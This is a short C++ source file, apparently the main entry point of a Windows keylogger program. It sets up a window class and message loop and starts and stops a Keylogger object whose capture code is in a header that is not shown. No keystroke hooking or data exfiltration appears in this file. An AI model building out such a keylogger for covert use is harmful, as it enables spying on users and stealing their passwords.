// Keylogger.cpp : Defines the entry point for the console application.
//


#include "stdafx.h"
#include <windows.h>
#include <string>
#include <tchar.h>
#include <stdio.h>
#include <cstdlib>
#include <memory>
#include <io.h>
#include <fcntl.h>

#include "Keylogger.h"

using namespace std;

shared_ptr<Keylogger> logger;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam);

INT WINAPI _tmain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, INT iCmdShow) {
	
	// Add console for debug
	AllocConsole();
	freopen("CONOUT$", "w", stdout);

	MSG msg;
	WNDCLASS wndClass;
	wndClass.lpfnWndProc = WndProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInstance;
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hbrBackground = NULL;
	wndClass.lpszMenuName = NULL;
	wndClass.lpszClassName = L"window";
	RegisterClass(&wndClass);

	logger = make_shared<Keylogger>();
	logger->start();
	while (GetMessage(&msg, NULL, 0, 0)) {
		DispatchMessage(&msg);
	}

	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_QUIT:
	case WM_CLOSE:
		logger->stop();
		return 0;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
}

